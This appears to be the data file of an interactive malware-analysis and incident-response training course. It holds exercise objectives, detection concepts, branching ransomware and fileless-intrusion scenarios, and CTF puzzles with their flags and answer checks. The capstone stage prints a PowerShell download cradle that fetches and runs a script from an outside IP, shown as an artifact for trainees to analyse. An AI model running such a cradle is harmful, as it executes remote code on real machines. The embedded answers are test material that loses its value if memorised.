    { k: 'magic', t: 'Identify the format from its magic' },
    { k: 'entry', t: 'Read the entry point' },
    { k: 'loader', t: 'Which does the OS loader use — sections or segments?' },
    { k: 'packed', t: 'Which section flags packing?' }
  ],
  static: [
    { k: 'packed', t: 'Detect packing from entropy' },
    { k: 'c2', t: 'Recover the C2 (FLOSS)' },
    { k: 'hash', t: 'Hash & check reputation' },
    { k: 'yara', t: 'Write a clean YARA rule' }
  ],
  ghidra: [
    { k: 'logic', t: 'Deduce what the function does' },
    { k: 'struct', t: 'Recover the struct layout' },
    { k: 'xref', t: 'Follow the cross-reference' }
  ],
  dynamic: [
    { k: 'persist', t: 'Identify the persistence mechanism' },
    { k: 'inject', t: 'Identify the injection technique' },
    { k: 'c2', t: 'Identify the C2 endpoint' },
    { k: 'impact', t: 'Identify the impact / payload' }
  ],
  unpack: [
    { k: 'oep', t: 'Find the Original Entry Point' },
    { k: 'dump', t: 'Dump the image at OEP' },
    { k: 'iat', t: 'Why rebuild the IAT?' },
    { k: 'patch', t: 'NOP-patch the check' }
  ],
  memory: [
    { k: 'hidden', t: 'Find the DKOM-hidden process' },
    { k: 'rwx', t: 'Find its RWX VAD' },
    { k: 'shellcode', t: 'Disassemble the injected shellcode' }
  ],
  network: [
    { k: 'beacon', t: 'Identify the beaconing C2 host' },
    { k: 'interval', t: 'Measure the beacon interval' },
    { k: 'ja3', t: 'Match the malicious JA3' },
    { k: 'file', t: 'Carve the transferred file' }
  ],
  protocol: [
    { k: 'magic', t: 'Find the frame magic bytes' },
    { k: 'frames', t: 'Count the frames' },
    { k: 'key', t: 'Recover the XOR key' },
    { k: 'cmd', t: 'Decode an operator command' }
  ],
  rootkit: [
    { k: 'persist', t: 'Find the persistence Run key' },
    { k: 'timestomp', t: 'Detect the timestomped file' },
    { k: 'service', t: 'Find the malicious service (7045)' },
    { k: 'hook', t: 'Identify the SSDT hook' }
  ],
  capstone: [
    { k: 'access', t: 'Initial access' },
    { k: 'exec', t: 'Execution' },
    { k: 'c2', t: 'Command & control' },
    { k: 'impact', t: 'Impact' }
  ]
};

export const THREADS = {
  pyramid: {
    name: 'The Pyramid of Pain',
    accent: 'var(--blood)',
    blurb: `How much it hurts an adversary when you burn each indicator type. The higher you push detection, the more expensive it is for them to adapt. Tap a tier.`,
    tiers: [
      { b: `TTPs`, pain: `TOUGH — change how they operate`, note: `Behaviours and techniques. The hardest thing to change — built in Phase 12.`, w: 46, c: 'var(--blood)' },
      { b: `Tools`, pain: `Challenging — rebuild/replace tooling`, note: `Their malware/implants. Burned by Phases 6, 7, 10.`, w: 58, c: 'var(--amber)' },
      { b: `Network / Host Artifacts`, pain: `Annoying`, note: `Files, registry keys, mutexes, C2 patterns. Phases 8, 9, 11.`, w: 70, c: 'var(--amber)' },
      { b: `Domain Names`, pain: `Simple to rotate`, note: `Re-register or DGA. Phase 9.`, w: 80, c: 'var(--volt)' },
      { b: `IP Addresses`, pain: `Easy to rotate`, note: `New infrastructure in minutes. Phase 9.`, w: 90, c: 'var(--volt)' },
      { b: `Hash Values`, pain: `Trivial — one byte = new hash`, note: `Defeated by a single recompile/repack. Phase 4.`, w: 100, c: 'var(--ash)' }
    ]
  },
  crossview: {
    name: 'Cross-view detection',
    accent: 'var(--volt)',
    blurb: `The single idea that unifies the detection phases: stealth corrupts ONE source of truth, so you compare two views that should agree and read the gap. Same move, four phases.`,
    rows: [
      [`Hidden process`, `windows.pslist`, `windows.psscan`, `Phase 8 / 11`],
      [`Timestomped file`, `$STANDARD_INFORMATION`, `$FILE_NAME`, `Phase 11`],
      [`Hidden process (Linux)`, `ps / /proc`, `memory image scan`, `Phase 8 / 11`],
      [`C2 intent`, `the pcap (what)`, `the binary (how/why)`, `Phase 9 / 10`],
      [`Hidden kernel module`, `windows.modules`, `windows.modscan`, `Phase 11`]
    ]
  },
  sbd: {
    name: 'Static before dynamic',
    accent: 'var(--amber)',
    blurb: `The discipline that keeps analysis honest: form a hypothesis from static evidence, THEN confirm or break it dynamically. Skipping the prediction turns learning into rote.`,
    loop: [`Static recon`, `Form hypothesis`, `Detonate / observe`, `Confirm or break`, `Refine`]
  },
  oil: {
    name: 'Observation → Inference → Skill',
    accent: 'var(--volt)',
    blurb: `Your learning meta-loop. Don't memorize outputs — observe a behaviour, infer the mechanism, and turn that into a transferable skill you can apply to the next unknown.`,
    loop: [`Observe`, `Infer mechanism`, `Generalize`, `Apply to new sample`]
  },
  killchain: {
    name: 'The kill chain',
    accent: 'var(--blood)',
    blurb: `The attacker stages you reconstruct in Phase 12 — and the phase whose skills illuminate each one. Tap a stage.`,
    stages: [
      { b: `Initial Access`, s: `Delivery / exploit`, m: `Network 9 · Artifacts 11` },
      { b: `Execution`, s: `Code runs`, m: `Dynamic 6 · Memory 8` },
      { b: `Persistence`, s: `Survive reboot`, m: `Artifacts 11 (registry/WMI)` },
      { b: `Priv-Esc`, s: `Gain rights`, m: `RE 5 · Memory 8` },
      { b: `Defense Evasion`, s: `Hide`, m: `Unpacking 7 · Rootkits 11` },
      { b: `C2`, s: `Phone home`, m: `Network 9 · Protocol 10` },
      { b: `Lateral Movement`, s: `Spread`, m: `Network 9 · Artifacts 11` },
      { b: `Collection`, s: `Gather data`, m: `Dynamic 6 · Memory 8` },
      { b: `Exfiltration`, s: `Steal it out`, m: `Network 9 (DNS tunnel)` }
    ]
  }
};

export const CASES = {
  ransomware: {
    label: 'HERMES-07 // Ransomware',
    start: 'start',
    nodes: {
      start: {
        clock: '07:14 — DETECTION',
        text: `SOC alert: workstation <b>HERMES-07</b> is making periodic outbound connections to an unfamiliar host. A user reports files renamed with a strange extension and a <b>README</b> dropped on the desktop. You have console access. What's your FIRST move?`,
        choices: [
          { label: `Reboot the machine to "clear" the malware`, to: 'reboot', good: false, fb: `You just destroyed every volatile artifact — running processes, injected memory, live connections, keys in RAM. Order of volatility: capture memory FIRST.` },
          { label: `Capture a full RAM image before touching anything else`, to: 'mem', good: true, fb: `Correct. Most volatile evidence first. The image freezes processes, injected code, and live C2 state.` },
          { label: `Open the README and start reading for clues`, to: 'mem', good: false, fb: `Tempting, but premature — and you risk interacting with the live host. Image RAM first; the note will still be there. (Proceeding to acquisition.)` }
        ]
      },
      reboot: {
        clock: '07:16 — EVIDENCE LOST',
        text: `The box is back at the login screen. RAM is wiped. You've lost the injected payload, the live C2 socket, and any in-memory keys. Lesson logged — restart and capture memory first.`,
        choices: [{ label: `↻ Restart: capture RAM first this time`, to: 'mem', good: true, fb: `Resetting with the right instinct.` }]
      },
      mem: {
        clock: '07:22 — MEMORY',
        text: `You have <code>hermes07.raw</code>. Volatility is ready. Where do you look to surface a hidden intruder?`,
        choices: [
          { label: `pslist only — trust the active process list`, to: 'mem', good: false, fb: `pslist walks the EPROCESS linked list, which DKOM can unlink. On its own it proves nothing. Cross-view it.` },
          { label: `Cross-view pslist vs psscan, then malfind + netscan`, to: 'net', good: true, fb: `psscan reveals a process hidden from pslist; malfind flags an RX private region (injected shellcode); netscan recovers a C2 IP. Three leads in one pass.` }
        ]
      },
      net: {
        clock: '07:40 — NETWORK',
        text: `netscan gave you a C2 IP. You also have a perimeter <code>capture.pcap</code> for HERMES-07. What do you extract?`,
        choices: [
          { label: `Block the IP at the firewall and close the ticket`, to: 'net', good: false, fb: `You've stopped one beacon and learned nothing about scope, tooling, or what was taken. Characterise before you contain-and-forget.` },
          { label: `Find the beacon cadence + JA3; carve any dropped file`, to: 'disk', good: true, fb: `A 60s ±20% beacon (evasion-aware), a JA3 matching a known framework, and an HTTP-carved dropper you can hash. Now you know HOW it talks.` }
        ]
      },
      disk: {
        clock: '08:05 — DISK ARTIFACTS',
        text: `You image the disk. To establish persistence, execution, and tampering, which artifacts do you parse?`,
        choices: [
          { label: `$MFT ($SI vs $FN), ShimCache/AmCache, EVTX (4688/7045/1102)`, to: 'bin', good: true, fb: `$FN/$SI disagree → the dropper was timestomped. AmCache proves it executed. A 7045 shows a malicious service; a 1102 shows logs were cleared. The timeline takes shape.` },
          { label: `Just check whether the dropper file still exists`, to: 'bin', good: false, fb: `Presence/absence alone is weak — and the file may be deleted. Execution + persistence + tamper evidence is what builds the story. (Parsing artifacts anyway.)` }
        ]
      },
      bin: {
        clock: '08:40 — THE BINARY',
        text: `You have the carved dropper. strings is nearly empty and one section is near-8.0 entropy. How do you analyse it?`,
        choices: [
          { label: `Run it on your own workstation to "see what it does"`, to: 'bin', good: false, fb: `Never detonate on your host — that spreads the incident. Use the isolated lab with a snapshot.` },
          { label: `It's packed → unpack at OEP, detonate in the sandbox, pair C2 with the code`, to: 'report', good: true, fb: `You unpack, dump at OEP, confirm the ransomware behaviour dynamically, and pair the captured C2 with the send/crypto routine — closing the wire↔code loop.` }
        ]
      },
      report: {
        clock: '09:30 — RECONSTRUCTION',
        end: true,
        text: `Full chain: phishing dropper (timestomped) → injected, packed payload → malicious service for persistence → evasion-aware C2 (known framework via JA3) → file encryption → log clearing. You write it up: a super-timeline where every claim cites an artifact, an ATT&CK matrix, IOCs with provenance, Sigma/Suricata/YARA detections — plus an honest note on what the evidence does NOT prove.`,
        choices: []
      }
    }
  },
  fileless: {
    label: 'NItro // Fileless (LOLBin)',
    start: 'start',
    nodes: {
      start: {
        clock: '10:02 — EDR ALERT',
        text: `EDR flags <b>winword.exe</b> spawning <b>powershell.exe</b> with a long encoded command. The user opened an "invoice" attachment. A disk scan finds <b>no malicious binary</b>. First move?`,
        choices: [
          { label: `Hunt the disk for the malware executable`, to: 'logs', good: false, fb: `Fileless intrusions often drop nothing to disk — you'll burn time. The evidence lives in process lineage, script logs, and memory. (Pivoting there.)` },
          { label: `Pull the PowerShell logs + the parent→child process tree`, to: 'logs', good: true, fb: `Right call. The Office→PowerShell lineage and 4104 scriptblock logs are exactly where a fileless attack shows itself.` },
          { label: `Reimage the machine immediately`, to: 'logs', good: false, fb: `You'd destroy the only evidence and learn nothing about scope or C2. Investigate before you remediate. (Pulling logs instead.)` }
        ]
      },
      logs: {
        clock: '10:15 — LOGS',
        text: `Scriptblock logging (EVTX 4104) shows a <code>-enc</code> base64 PowerShell command. What now?`,
        choices: [
          { label: `Decode the base64 and read the script`, to: 'decode', good: true, fb: `Decoded: it uses a trusted system binary to fetch and run an in-memory payload from a URL — a living-off-the-land download cradle.` },
          { label: `Dismiss it — encoded commands are normal noise`, to: 'decode', good: false, fb: `Encoded one-liners spawned from Office are a classic execution technique, not noise. (Decoding it anyway.)` }
        ]
      },
      decode: {
        clock: '10:28 — THE CRADLE',
        text: `The decoded script uses a LOLBin to pull and execute a payload <b>in memory</b> from hxxp://… Where does the payload live?`,
        choices: [
          { label: `On disk in the Temp folder`, to: 'mem', good: false, fb: `No — "in memory" is the whole point of fileless. There's nothing in Temp to find. Capture RAM and hunt the injected region. (Doing that.)` },
          { label: `In memory only — capture RAM and hunt the injected code`, to: 'mem', good: true, fb: `Exactly. Fileless payloads are resident only in RAM, so memory forensics is the way to recover them.` }
        ]
      },
      mem: {
        clock: '10:45 — MEMORY',
        text: `RAM capture: powershell.exe holds an RX private region (malfind) and a live connection (netscan). Next?`,
        choices: [
          { label: `Dump the injected region, ID the framework, pull the C2`, to: 'persist', good: true, fb: `The dumped shellcode matches a known offensive framework; netscan + the dump give you the C2 endpoint and beacon. Now scope persistence.` },
          { label: `Kill the process and stop`, to: 'persist', good: false, fb: `Killing one process leaves persistence and scope unknown — it'll be back at reboot. Keep going. (Checking persistence.)` }
        ]
      },
      persist: {
        clock: '11:10 — PERSISTENCE',
        text: `Fileless threats often persist without a file. Where do you look?`,
        choices: [
          { label: `WMI event subscriptions + registry-stored scripts + scheduled tasks`, to: 'net', good: true, fb: `You find a WMI event-consumer subscription re-launching the cradle at logon — fileless persistence with nothing on disk.` },
          { label: `Only the Startup folder`, to: 'net', good: false, fb: `Too narrow — the Startup folder is empty here. WMI/registry/tasks are the fileless persistence homes. (Found a WMI subscription.)` }
        ]
      },
      net: {
        clock: '11:35 — SCOPE',
        text: `C2 is HTTPS; JA3 matches the framework; beacon every 45s ±30%. How do you scope the rest of the fleet?`,
        choices: [
          { label: `Hunt the JA3 + beacon pattern across proxy/EDR fleet-wide`, to: 'report', good: true, fb: `The JA3 + cadence surface two more beaconing hosts — the intrusion is broader than HERMES-07. Now report.` },
          { label: `Assume it's a single isolated host`, to: 'report', good: false, fb: `Assuming single-host scope is how intrusions get missed. The JA3/beacon pattern is exactly what scopes laterally. (Hunting fleet-wide anyway.)` }
        ]
      },
      report: {
        clock: '12:20 — RECONSTRUCTION',
        end: true,
        text: `Chain: malicious macro (initial access) → encoded PowerShell via LOLBin (execution, defense evasion: fileless) → in-memory framework payload → WMI subscription (persistence) → HTTPS C2 by JA3 (command & control) → two more victims (lateral scope). Detections: a Sigma rule for Office→PowerShell + 4104 cradle patterns, a Suricata rule on the JA3/beacon, YARA on the dumped payload — plus honest limits on what memory alone can prove.`,
        choices: []
      }
    }
  }
};

export const CY = {
  rot: { flag: 'BV{r0t_and_r0ll}', enc: () => cyCaesar('BV{r0t_and_r0ll}', 7) },
  b64: { flag: 'BV{b4se_st4ck}', enc: () => btoa(btoa('BV{b4se_st4ck}')) },
  xor: { flag: 'BV{xor_is_not_crypto}', enc: () => cyHex(cyXorStr('BV{xor_is_not_crypto}', 42)) },
  rev: { flag: 'BV{backwards_thinking}', enc: () => 'BV{backwards_thinking}'.split('').reverse().join('') }
};

export const CAP = [
  { obj: 'access', title: 'Stage 1 · Initial access', art: 'EMAIL\n  From: billing@inv0ice-corp.com\n  Attachment: invoice_2026.xlsm  (macro-enabled spreadsheet)', q: 'Attachment file type that delivered it?', test: v => /xlsm|macro|excel|spreadsheet/i.test(v), fb: 'Macro-enabled Office doc → user-enabled macros = initial access.' },
  { obj: 'exec', title: 'Stage 2 · Execution', art: 'PROCESS\n  excel.exe → cmd.exe → powershell.exe -nop -w hidden -enc SUVYIChOZXct...\n  (decodes to: IEX (New-Object Net.WebClient).DownloadString(\'http://185.220.101.47/x.ps1\'))', q: 'What executed the payload? (interpreter)', test: v => /powershell|iex|pwsh/i.test(v), fb: 'Macro spawned PowerShell with a download cradle — living off the land.' },
  { obj: 'c2', title: 'Stage 3 · Command & control', art: 'PCAP\n  10.0.2.15 → 185.220.101.47:443 every ~60s, low jitter (beacon)', q: 'C2 IP address?', test: v => /185\.220\.101\.47/.test(v), fb: 'Periodic beacon to a hardcoded IP = C2 channel.' },
  { obj: 'impact', title: 'Stage 4 · Impact', art: 'HOST\n  CryptEncrypt over *.docx/*.xlsx, files renamed *.vault, READ_ME.vault.txt dropped', q: 'Attacker objective / impact?', test: v => /ransom|encrypt|impact/i.test(v), fb: 'Mass encryption + ransom note = ransomware. Chain reconstructed.' }
];

// Helper functions needed in data context if any, but since Caesar helper functions are standard, we put them here
function cyCaesar(s, k) { k = ((k % 26) + 26) % 26; return s.replace(/[a-z]/g, c => String.fromCharCode((c.charCodeAt(0) - 97 + k) % 26 + 97)).replace(/[A-Z]/g, c => String.fromCharCode((c.charCodeAt(0) - 65 + k) % 26 + 65)); }
function cyXorStr(s, k) { let o = ''; for (let i = 0; i < s.length; i++) o += String.fromCharCode(s.charCodeAt(i) ^ k); return o; }
function cyHex(s) { let o = ''; for (let i = 0; i < s.length; i++) o += s.charCodeAt(i).toString(16).padStart(2, '0'); return o; }
function cyFromHex(s) { s = s.replace(/[^0-9a-fA-F]/g, ''); let o = ''; for (let i = 0; i + 1 < s.length + 1; i += 2) { if (i + 2 > s.length) break; o += String.fromCharCode(parseInt(s.substr(i, 2), 16)); } return o; }
